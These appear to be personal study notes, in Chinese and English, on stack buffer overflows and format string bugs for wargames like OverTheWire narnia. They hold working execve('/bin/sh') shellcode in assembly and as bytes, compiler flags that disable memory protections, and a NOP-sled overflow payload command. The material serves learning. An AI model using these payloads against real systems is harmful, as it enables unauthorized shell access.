Byte ordering
![image](https://slideplayer.com/slide/9303999/28/images/9/Byte+ordering+function+calls+%282%2F6%29.jpg)

## 16进制hex里面每个字符(0->f)都代表4个bit
32位有8个hex decimal (4*8=32bits)
64位有16个hex decimal (4*16=64bits)


# shellcode 

### compile 

```
gcc -m32 -g -mpreferred-stack-boundary=2 -fno-stack-protector -Wl,-z,norelro -z execstack example.c -o example

-no-pie: disable PIE (position independent executable)
-z execstack: to disable NX (making stack executable)
-Wl,-z,norelro: disable RELRO (readonly relocations)
-fno-stack-protector: remove stack protection (stack overflow security checks)
And for convenience:

-g: add debugging

-mpreferred-stack-bounary=2: align stack on 4-byte boundary

---


nasm -f elf32 example.asm -o example.o

ld -m elf_i386 example.o

as --32 example.s -o example.o
```
- execstack: allow ....

### call from c
```
int (*foo)() = (int(*)())code;
  foo_value = foo();
  
OR
just
(*(void(*)()) shellcode)();

```


```
// nasm 
global _start

section .text
_start:
    jmp short call_shellcode

shellcode:
    pop ebx                    ; address of '/bin/sh'
    xor eax,eax
    mov al, 11                 ; 0xb
    int 0x80

call_shellcode:
    call shellcode
    message db "/bin/sh"       ; no need to add \0 manually



nasm -f elf32 example.asm -o example.o

ld -m elf_i386 example.o

./a.out

```


```
example2.asm (nasm) 25 bytes


global _start

section .text

_start:
	jmp getString

shell:
	xor eax, eax
	pop ebx
	xor ecx, ecx
	xor edx, edx
	mov al, 0xb
	int 0x80

getString:
	call shell
	db "/bin/sh"

\xeb\x0b\x31\xc0\x5b\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68


```

## NOP(No operation performed)

```
\x90
a sled，雪橇，EIP跟着NOP往前（高地址）滑，可以当作shellcode前面的填充物。

```

## GDB 

```
x/wx 。。。 记得加个w代表word，32位，不然的话会打印nibbles
```

## print shellcode bytes 

```
Example
$(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4')

$(echo -n -e "\x31\xc0\x50\x68\x2f") 
$(echo -n -e "\x31\xc0\x50\x68\x2f") > inputFile  把inputFile里现有的内容删掉然后写入
$(echo -n -e "\x31\xc0\x50\x68\x2f") >> inputFile 在已有内容的后面添加
```


### 容易踩的陷阱
[link](https://stackoverflow.com/questions/38416045/im-trying-to-exploit-a-bufferoverflow-am-i-doing-something-wrong)
```
./vulne $(python -c 'print "\x90"*(256+4-25-40) + "\xeb\x0b\x31\xc0\x5b\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"+"\x90"*40 + "\x10\xd3\xff\xff"')
```
> 重点重点重点！！！！！ 注意看shellcode是在NOP sled的中间，而不是在最后


## Stack Alignment 

- GCC aligned default 16 bytes 
- 一旦local var >= 17，gcc就会分配32bytes
- 

## Vulnerability lists 

- [Format string vulnerability](https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf)
- 

### Format string vulnerability 
Overthewire - narnia5

针对printf家族的函数


```
如果str来源不安全,
printf(str); 就能被攻击。
```
所以要满足以下条件
1. printf(str); 后续va_arg 参数不对
2. 攻击者能够操控str
3. 在str里放入%x,%s,%n等 specifiers

在printf那一行下一个断点，这一刻的stack：

![illlustration](./format_string_stack.png)